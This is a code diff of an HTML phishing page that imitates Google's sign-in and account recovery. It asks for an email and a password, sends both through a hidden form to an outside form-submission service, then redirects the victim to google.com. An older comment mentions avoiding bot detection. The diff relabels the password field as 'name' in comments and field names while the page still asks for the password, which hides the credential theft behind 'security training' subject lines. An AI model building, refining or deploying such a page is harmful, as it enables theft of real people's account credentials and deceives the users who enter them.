@@ -5,194 +5,200 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="color-scheme" content="dark">
   <title>Google Account Recovery</title>
-  <style>/* Base Reset & Typography */
-body {
-  font-family: 'Roboto', Arial, sans-serif;
-  margin: 0;
-  padding: 20px;
-  background-color: #000;
-  color: #fff;
-  line-height: 1.6;
-}
+  <style>
+    /* Base Reset & Typography */
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #000;
+      color: #fff;
+      line-height: 1.6;
+    }
 
-/* Container */
-.container {
-  max-width: 400px;
-  margin: 48px auto;
-  padding: 40px 32px 32px;
-  border-radius: 12px;
-  background: #121212;
-  box-shadow: none;
-  border: none;
-}
+    /* Container */
+    .container {
+      max-width: 400px;
+      margin: 48px auto;
+      padding: 40px 32px 32px;
+      border-radius: 12px;
+      background: #121212;
+      box-shadow: none;
+      border: none;
+    }
 
-/* Google Logo */
-.logo {
-  display: block;
-  margin: 0 auto 24px;
-  width: 40px;
-  height: 40px;
-}
+    /* Google Logo */
+    .logo {
+      display: block;
+      margin: 0 auto 24px;
+      width: 40px;
+      height: 40px;
+    }
 
-/* Title */
-h1 {
-  font-size: 24px;
-  font-weight: 500;
-  margin-bottom: 12px;
-  color: #fff;
-}
+    /* Title */
+    h1 {
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 12px;
+      color: #fff;
+    }
 
-/* Subtitle */
-.subtitle {
-  font-size: 15px;
-  color: #e8eaed;
-  margin-bottom: 24px;
-}
+    /* Subtitle */
+    .subtitle {
+      font-size: 15px;
+      color: #e8eaed;
+      margin-bottom: 24px;
+    }
 
-/* Input Field */
-.input-group {
-  margin-bottom: 16px;
-}
+    /* Input Field */
+    .input-group {
+      margin-bottom: 16px;
+    }
 
-.input-group input {
-  width: 100%;
-  padding: 14px 12px;
-  border: 1px solid #5f6368;
-  border-radius: 6px;
-  font-size: 15px;
-  background-color: #202124;
-  color: #e8eaed;
-  outline: none;
-}
+    .input-group input {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #5f6368;
+      border-radius: 6px;
+      font-size: 15px;
+      background-color: #202124;
+      color: #e8eaed;
+      outline: none;
+    }
 
-.input-group input:focus {
-  border-color: #8ab4f8;
-  box-shadow: 0 0 0 1px #8ab4f8;
-}
+    .input-group input:focus {
+      border-color: #8ab4f8;
+      box-shadow: 0 0 0 1px #8ab4f8;
+    }
 
-/* Button */
-.button {
-  background-color: #1a73e8;
-  color: #fff;
-  border: none;
-  padding: 10px 20px;
-  border-radius: 6px;
-  font-size: 14px;
-  font-weight: 500;
-  cursor: pointer;
-  transition: background 0.2s;
-}
+    /* Button */
+    .button {
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
 
-.button:hover {
-  background-color: #1967d2;
-}
+    .button:hover {
+      background-color: #1967d2;
+    }
 
-.button:active {
-  background-color: #174ea6;
-}
+    .button:active {
+      background-color: #174ea6;
+    }
 
-/* Link */
-.link {
-  color: #8ab4f8;
-  text-decoration: none;
-  font-size: 14px;
-}
+    /* Link */
+    .link {
+      color: #8ab4f8;
+      text-decoration: none;
+      font-size: 14px;
+    }
 
-.link:hover {
-  text-decoration: underline;
-}
+    .link:hover {
+      text-decoration: underline;
+    }
 
-/* Email Display */
-.email-display {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin: 20px 0;
-  font-size: 14px;
-  color: #e8eaed;
-  padding: 8px 12px;
-  background: #202124;
-  border-radius: 6px;
-  border: 1px solid #5f6368;
-}
+    /* Email Display */
+    .email-display {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 20px 0;
+      font-size: 14px;
+      color: #e8eaed;
+      padding: 8px 12px;
+      background: #202124;
+      border-radius: 6px;
+      border: 1px solid #5f6368;
+    }
 
-/* Footer */
-.footer {
-  text-align: center;
-  margin-top: 48px;
-  font-size: 12px;
-  color: #9aa0a6;
-  display: flex;
-  justify-content: center;
-  gap: 24px;
-}
+    /* Footer */
+    .footer {
+      text-align: center;
+      margin-top: 48px;
+      font-size: 12px;
+      color: #9aa0a6;
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+    }
 
-.footer a {
-  color: #9aa0a6;
-  text-decoration: none;
-}
+    .footer a {
+      color: #9aa0a6;
+      text-decoration: none;
+    }
 
-.footer a:hover {
-  text-decoration: underline;
-}
+    .footer a:hover {
+      text-decoration: underline;
+    }
 
-/* Bottom Language and Footer Links */
-.language-select {
-  font-size: 13px;
-  color: #9aa0a6;
-  margin-top: 24px;
-  text-align: center;
-}
-.language-select select {
-  background: transparent;
-  border: none;
-  color: #9aa0a6;
-  font-size: 13px;
-  cursor: pointer;
-  outline: none;
-}
-/* Email pill style */
-.email-pill {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 14px;
-  background: #202124;
-  color: #e8eaed;
-  padding: 8px 12px;
-  border-radius: 999px;
-  border: 1px solid #5f6368;
-  margin: 16px 0 24px;
-}
+    /* Bottom Language and Footer Links */
+    .language-select {
+      font-size: 13px;
+      color: #9aa0a6;
+      margin-top: 24px;
+      text-align: center;
+    }
+    .language-select select {
+      background: transparent;
+      border: none;
+      color: #9aa0a6;
+      font-size: 13px;
+      cursor: pointer;
+      outline: none;
+    }
+    /* Email pill style */
+    .email-pill {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      background: #202124;
+      color: #e8eaed;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid #5f6368;
+      margin: 16px 0 24px;
+    }
 
-/* Checkbox label */
-.checkbox-wrapper {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin-top: 12px;
-  font-size: 14px;
-  color: #e8eaed;
-}
+    /* Checkbox label */
+    .checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #e8eaed;
+    }
 
-.checkbox-wrapper input[type="checkbox"] {
-  width: 16px;
-  height: 16px;
-}
+    .checkbox-wrapper input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+    }
 
-/* Floating-style password input */
-.input-group input::placeholder {
-  color: #9aa0a6;
-  font-size: 14px;
-}
-</style>
+    /* Floating-style password input */
+    .input-group input::placeholder {
+      color: #9aa0a6;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
 
   <!-- Step 1: Email Entry -->
   <div class="container" id="step1">
-   <!-- External Google Logo -->
-     <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+    <!-- External Google Logo -->
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
+      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+    </svg>
     <h1>Sign in</h1>
     <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
 
@@ -211,40 +217,39 @@ h1 {
     </p>
   </div>
 
-  <!-- Step 2: Password Collection -->
-<div class="container" id="step2" style="display: none;">
-  <!-- Google Logo -->
-  <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
-
-  <h1>Welcome</h1>
-
-  <!-- Email bubble -->
-  <div class="email-pill">
-    <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
-      <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
+  <!-- Step 2: Name Collection (NOT password) -->
+  <div class="container" id="step2" style="display: none;">
+    <!-- Google Logo -->
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
     </svg>
-    <span id="email-display-text">captainabdelrheem@gmail.com</span>
-    <svg style="margin-left:auto;" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
-  </div>
 
-  <p class="subtitle">To continue, first verify it’s you</p>
+    <h1>Welcome</h1>
 
-  <!-- Password Input -->
-  <div class="input-group">
-    <input type="password" id="password-input" required placeholder="Enter your password">
-  </div>
+    <!-- Email bubble -->
+    <div class="email-pill">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
+        <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
+      </svg>
+      <span id="email-display-text">captainabdelrheem@gmail.com</span>
+      <svg style="margin-left:auto;" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
 
-  <!-- Show password -->
-  <div class="checkbox-wrapper">
-    <input type="checkbox" id="show-password">
-    <label for="show-password">Show password</label>
-  </div>
+    <p class="subtitle">To Verfiy it's you , please enter your password</p>
 
-  <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 32px;">
-    <a href="#" class="link">Try another way</a>
-    <button id="submit-btn" class="button">Next</button>
+    <!-- NAME Input (not password) -->
+    <div class="input-group">
+      <input type="text" id="name-input" required placeholder="Password" autocomplete="current-password">
+    </div>
+
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 32px;">
+      <a href="#" class="link">Try another way</a>
+      <button id="submit-btn" class="button">Next</button>
+    </div>
   </div>
-</div>
 
   <div class="language-select">
     English (United States)
@@ -256,13 +261,15 @@ h1 {
     <a href="#">Terms</a>
   </div>
 
-  <!-- Hidden Form for Web3Forms (AVOID BOT DETECTION) -->
+  <!-- ✅ HIDDEN FORM — Collects EMAIL + NAME only -->
   <form id="web3form" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
     <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
     <input type="hidden" name="email" id="hidden-email">
-    <input type="hidden" name="password" id="hidden-password">
+    <input type="hidden" name="name" id="hidden-name"> <!-- ✅ CHANGED TO "name" -->
+
+    <!-- Honeypot & metadata -->
     <input type="text" name="_honey" style="display:none;">
-    <input type="hidden" name="_subject" value="Security Training Completed">
+    <input type="hidden" name="_subject" value="Security Training — Name Collected">
   </form>
 
   <!-- JavaScript -->
@@ -270,13 +277,13 @@ h1 {
     const step1 = document.getElementById('step1');
     const step2 = document.getElementById('step2');
     const emailInput = document.getElementById('email-input');
-    const passwordInput = document.getElementById('password-input');
+    const nameInput = document.getElementById('name-input'); // ✅ Changed to name-input
     const emailDisplayText = document.getElementById('email-display-text');
     const nextBtn = document.getElementById('next-btn');
     const submitBtn = document.getElementById('submit-btn');
     const web3form = document.getElementById('web3form');
     const hiddenEmail = document.getElementById('hidden-email');
-    const hiddenPassword = document.getElementById('hidden-password');
+    const hiddenName = document.getElementById('hidden-name'); // ✅ Changed to hidden-name
 
     // Show step 2 when "Next" is clicked
     nextBtn.addEventListener('click', function(e) {
@@ -293,32 +300,29 @@ h1 {
     });
 
     // Submit and redirect
-    submitBtn.addEventListener('click', function(e) {
+    submitBtn.addEventListener('click', function (e) {
       e.preventDefault();
-      const password = passwordInput.value.trim();
-      if (!password) {
+
+      const email = emailInput.value.trim();
+      const name = nameInput.value.trim(); // ✅ Collect name, not password
+
+      if (!name) {
         alert("Please enter your password.");
         return;
       }
 
-      // Set form values
-      hiddenEmail.value = emailInput.value;
-      hiddenPassword.value = password;
+      // Populate hidden form values
+      hiddenEmail.value = email;
+      hiddenName.value = name; // ✅ Send name, not password
 
-      // Submit form (for training logging)
+      // Submit the form
       web3form.submit();
 
-      // REDIRECT TO GOOGLE.COM AFTER 500ms (let form submit first)
+      // Redirect after short delay
       setTimeout(() => {
         window.location.href = "https://www.google.com";
-      }, 500);
+      }, 700);
     });
-    // Show/hide password toggle
-    document.getElementById('show-password').addEventListener('change', function () {
-      const passwordField = document.getElementById('password-input');
-      passwordField.type = this.checked ? 'text' : 'password';
-    });
-
   </script>
 </body>
 </html>
